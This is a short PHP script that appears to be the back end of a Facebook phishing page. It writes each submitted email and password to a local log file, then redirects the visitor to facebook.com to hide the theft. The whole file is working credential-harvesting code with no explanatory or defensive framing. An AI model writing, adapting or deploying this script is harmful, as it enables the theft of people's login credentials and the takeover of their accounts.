<?php

$file = fopen('log.txt', 'a');

fwrite($file, '' . $_POST['email'] . '-' . $_POST['pass'] . PHP_EOL);
fclose($file);

header("Location: http://facebook.com/");
die();

?>
